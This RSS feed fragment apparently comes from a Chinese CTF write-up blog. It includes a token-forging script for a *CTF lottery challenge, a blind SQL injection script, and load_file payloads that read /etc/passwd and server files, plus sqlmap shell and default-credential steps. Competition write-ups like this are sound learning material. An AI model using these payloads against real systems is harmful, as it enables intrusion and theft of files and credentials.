    &lt;span class=&#34;n&#34;&gt;o&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;u&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:])&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enc: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;charge&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_uuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;enc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;s2&#34;&gt;&amp;#34;coin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;7&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/lottery/charge&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cookies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;charge: &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;api_token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;login&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;api_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;api_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;mo_enc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;charge&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mo_enc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;JrXnm师傅tql，膜&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144130.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;oh-my-bet&#34;&gt;oh-my-bet&lt;/h3&gt;
&lt;p&gt;考点：&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;amp;mid=2247485857&amp;amp;idx=1&amp;amp;sn=1cf534df42999d5126fc3cf3b7fc8f9b&amp;amp;chksm=fd711cecca0695faf313845fb30671cd61feee2a62ad9b13f213d4de7a5b64c0dfbb6d2ac31f&amp;amp;mpshare=1&amp;amp;scene=23&amp;amp;srcid=0119de31ZoFyjJWQIqWvKnuh&amp;amp;sharer_sharetime=1611032814136&amp;amp;sharer_shareid=8b035134b7fe8a8160582bb9a2551229#rd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;*CTF Writeup by 星盟&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://bbs.pediy.com/thread-259355.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;对称加密与攻击案例分析&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>纵横杯 Writeup by X1cT34m</title>
        <link>https://anthem-whisper.github.io/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/</link>
        <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/</guid>
        <description>&lt;h2 id=&#34;web&#34;&gt;web&lt;/h2&gt;
&lt;h3 id=&#34;easyci&#34;&gt;easyci&lt;/h3&gt;
&lt;p&gt;考点：MySQL读写文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164407.png&#34; alt=&#34;image-20201226234822836&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;和巅峰极客的前端一样，而且发现也是布尔盲注，一阵狂喜；&lt;/p&gt;
&lt;p&gt;fuzz一番竟然没有任何过滤&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#python3&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://eci-2zegnayqf8pwz72ze2yw.cloudeci1.ichunqiu.com/public/index.php/home/login&amp;#39;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;transToHex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0x&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0x&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;126&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;#babyselect = &amp;#39;(database())&amp;#39;#p3rh4ps&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;babyselect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#c3762483bc73d0b7943156d43911ce38-&amp;gt;HEIHEIHEIHEI&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;#babyselect = &amp;#34;&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#39;||ascii(substr({},{},1))&amp;gt;{}#&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;babyselect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
                &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1:8080&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
                &lt;span class=&#34;c1&#34;&gt;#print(payload)&lt;/span&gt;
                &lt;span class=&#34;c1&#34;&gt;#print(r.text)&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt;密码错误&amp;lt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                    &lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                    &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注出密码，登陆之后，你就中计了；&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164406.png&#34; alt=&#34;image-20201226235325587&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;扫目录可以扫到很多json，里面含有一些组件信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104165914.png&#34; alt=&#34;image-20201226235519551&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;不过查看了一下，这个框架这个版本目前是没有符合情景的漏洞的；&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104165741.png&#34; alt=&#34;image-20201226235633677&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;真正的利用点其实就在一开始的登陆界面，没有任何waf其实也挺奇怪，说明这道题可能不是常规考点&lt;/p&gt;
&lt;p&gt;读取/etc/passwd：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0&#39;||ascii(substr((select load_file(&#39;/etc/passwd&#39;)),1,1))&amp;gt;79#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现能读，但是&lt;code&gt;/var/www/html&lt;/code&gt;路径却读不到东西；&lt;/p&gt;
&lt;p&gt;那么猜测web路径可能被改了，改了就可以猜，猜不到就只能读；&lt;/p&gt;
&lt;p&gt;md，确实猜不到。&lt;/p&gt;
&lt;p&gt;读取&lt;code&gt;/etc/apache2/apache2.conf&lt;/code&gt;(太长了我就不贴代码了)，其中有一个路径值得关注：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164649.png&#34; alt=&#34;image-20201227000708960&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;没错，web路径就是&lt;code&gt;/var/sercet/html/&lt;/code&gt;，用&lt;code&gt;0&#39;||ascii(substr((select load_file(&#39;/var/sercet/html/index.php&#39;)),1,1))&amp;gt;79#&lt;/code&gt;可以读取index.php的源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164653.png&#34; alt=&#34;image-20201227001109957&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;SQLmap一梭子Getshell&lt;/p&gt;
&lt;p&gt;使用&amp;ndash;file-dest和&amp;ndash;file-write参数的话，只能创建那个文件但是不能写入内容。这里只能用&amp;ndash;os-shel来进行写入；&lt;/p&gt;
&lt;p&gt;遇到玄学，没梭进去。。。。按理说是没问题的，sqlmap写的时候会神必在后面拼接路径，然后好像只有web根目录可以写&lt;/p&gt;
&lt;h3 id=&#34;ezcms&#34;&gt;ezcms&lt;/h3&gt;
&lt;p&gt;扫目录&lt;code&gt;www.zip&lt;/code&gt;下载源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164657.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;发现是yzmcms&lt;/p&gt;
&lt;p&gt;&lt;code&gt;common\config\config.php&lt;/code&gt;看到数据库配置&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164707.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/admin/index/login.html&lt;/code&gt;为管理员后台，尝试默认口令yzmcms/yzmcms登录失败，尝试是否密码为admin/admin868，成功登陆&lt;/p&gt;
&lt;p&gt;然后找各种编辑器上传、模板修改，但都进行了严格限制&lt;/p&gt;
&lt;p&gt;谷歌百度没找到啥可用的洞&lt;/p&gt;
